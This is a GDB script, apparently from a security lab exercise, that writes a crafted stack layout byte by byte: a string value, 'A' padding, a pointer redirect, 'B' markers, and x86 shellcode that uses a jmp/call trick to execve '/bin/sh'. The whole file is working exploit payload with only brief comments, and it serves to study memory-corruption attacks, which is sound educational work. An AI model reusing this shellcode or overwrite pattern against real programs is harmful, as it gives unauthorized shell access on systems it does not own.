
# mods for step 6
# required by our model
set var s = 771509048

# The initial value determined for s. Same result
# as above
set var *((unsigned char *) 0xbffff330) = 0x37
set var *((unsigned char *) 0xbffff331) = 0x37
set var *((unsigned char *) 0xbffff332) = 0x31
set var *((unsigned char *) 0xbffff333) = 0x35
set var *((unsigned char *) 0xbffff334) = 0x30
set var *((unsigned char *) 0xbffff335) = 0x39
set var *((unsigned char *) 0xbffff336) = 0x30
set var *((unsigned char *) 0xbffff337) = 0x34
set var *((unsigned char *) 0xbffff338) = 0x38
set var *((unsigned char *) 0xbffff339) = 0x00
# end of s
set var *((unsigned char *) 0xbffff33a) = 0x41
set var *((unsigned char *) 0xbffff33b) = 0x41
set var *((unsigned char *) 0xbffff33c) = 0x41
set var *((unsigned char *) 0xbffff33d) = 0x41
set var *((unsigned char *) 0xbffff33e) = 0x41
set var *((unsigned char *) 0xbffff33f) = 0x41
# end of spacer
# ptr[s]
set var *((unsigned char *) 0xbffff340) = 0x50
set var *((unsigned char *) 0xbffff341) = 0xf3
set var *((unsigned char *) 0xbffff342) = 0xff
set var *((unsigned char *) 0xbffff343) = 0xbf
# markers 
set var *((unsigned char *) 0xbffff344) = 0x42
set var *((unsigned char *) 0xbffff345) = 0x42
set var *((unsigned char *) 0xbffff346) = 0x42
set var *((unsigned char *) 0xbffff347) = 0x42
set var *((unsigned char *) 0xbffff348) = 0x42
set var *((unsigned char *) 0xbffff349) = 0x42
set var *((unsigned char *) 0xbffff34a) = 0x42
set var *((unsigned char *) 0xbffff34b) = 0x42
set var *((unsigned char *) 0xbffff34c) = 0x42
set var *((unsigned char *) 0xbffff34d) = 0x42
set var *((unsigned char *) 0xbffff34e) = 0x42
set var *((unsigned char *) 0xbffff34f) = 0x42
# start of initialStart - offset 010
# jump to call at end to push our string on the stack
set var *((unsigned char *) 0xbffff350) = 0xeb
set var *((unsigned char *) 0xbffff351) = 0x1d
# release the kracken
set var *((unsigned char *) 0xbffff352) = 0x5c
set var *((unsigned char *) 0xbffff353) = 0x89
set var *((unsigned char *) 0xbffff354) = 0xe3
set var *((unsigned char *) 0xbffff355) = 0x83
set var *((unsigned char *) 0xbffff356) = 0xc4
set var *((unsigned char *) 0xbffff357) = 0x08
set var *((unsigned char *) 0xbffff358) = 0x89
set var *((unsigned char *) 0xbffff359) = 0x1c
set var *((unsigned char *) 0xbffff35a) = 0x24
set var *((unsigned char *) 0xbffff35b) = 0x89
set var *((unsigned char *) 0xbffff35c) = 0xe1
set var *((unsigned char *) 0xbffff35d) = 0x89
set var *((unsigned char *) 0xbffff35e) = 0xc8
set var *((unsigned char *) 0xbffff35f) = 0x83

set var *((unsigned char *) 0xbffff360) = 0xc0
set var *((unsigned char *) 0xbffff361) = 0x04
set var *((unsigned char *) 0xbffff362) = 0x31
set var *((unsigned char *) 0xbffff363) = 0xd2
set var *((unsigned char *) 0xbffff364) = 0x89
set var *((unsigned char *) 0xbffff365) = 0x10
set var *((unsigned char *) 0xbffff366) = 0x31
set var *((unsigned char *) 0xbffff367) = 0xc0
set var *((unsigned char *) 0xbffff368) = 0x89
set var *((unsigned char *) 0xbffff369) = 0xc2
set var *((unsigned char *) 0xbffff36a) = 0x83
set var *((unsigned char *) 0xbffff36b) = 0xc0
set var *((unsigned char *) 0xbffff36c) = 0x0b
set var *((unsigned char *) 0xbffff36d) = 0xcd
set var *((unsigned char *) 0xbffff36e) = 0x80

# The call to Release the kracke5
set var *((unsigned char *) 0xbffff36f) = 0xe8
set var *((unsigned char *) 0xbffff370) = 0xde
set var *((unsigned char *) 0xbffff371) = 0xff
set var *((unsigned char *) 0xbffff372) = 0xff
set var *((unsigned char *) 0xbffff373) = 0xff
## The cmd string "/bin/sh"
set var *((unsigned char *) 0xbffff374) = 0x2f
set var *((unsigned char *) 0xbffff375) = 0x62
set var *((unsigned char *) 0xbffff376) = 0x69
set var *((unsigned char *) 0xbffff377) = 0x6e
set var *((unsigned char *) 0xbffff378) = 0x2f
set var *((unsigned char *) 0xbffff379) = 0x73
set var *((unsigned char *) 0xbffff37a) = 0x68
set var *((unsigned char *) 0xbffff37b) = 0x00




